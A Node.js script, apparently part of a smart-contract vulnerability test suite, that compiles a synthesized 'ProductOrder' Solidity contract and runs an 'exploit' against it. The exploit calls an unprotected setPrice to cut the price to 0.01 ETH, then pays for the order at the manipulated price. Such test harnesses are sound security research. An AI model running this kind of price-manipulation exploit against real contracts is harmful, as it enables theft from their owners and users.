require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');

const { createLoggerWeb3 } = require('@lib/web3/deploy');


const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
let contractFileFullName = 'ProductOrder-20.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');



async function exploit(web3, envInfo, contractAddress) {
    try {   
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, contractFileFullName, 'ProductOrder', solcVersion);
        
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        console.log("Setting price to a nominal amount...");

        // Set the price to a very low amount
        await contractInstance.methods.setPrice(web3.utils.toWei('0.01', 'ether')).send({
            from: web3.eth.accounts.wallet[0].address,
            gas: 3000000
        });
        await sleep(200);

        console.log("Price has been set to 0.01 ETH.");

        // Proceed to pay for the order at the new price
        let payReceipt = await contractInstance.methods.payForOrder().send({
            from: web3.eth.accounts.wallet[0].address,
            value: web3.utils.toWei('0.01', 'ether'),
            gas: 3000000
        });

        if (payReceipt.status) {
            console.log("Order paid for at manipulated price.");
            return true;
        } else {
            console.error("Failed to pay for the order.");
            return false;
        }
    } catch (error) {
        console.error("Failed to execute exploit due to:", error.stack);
        return false;
    }
}




module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
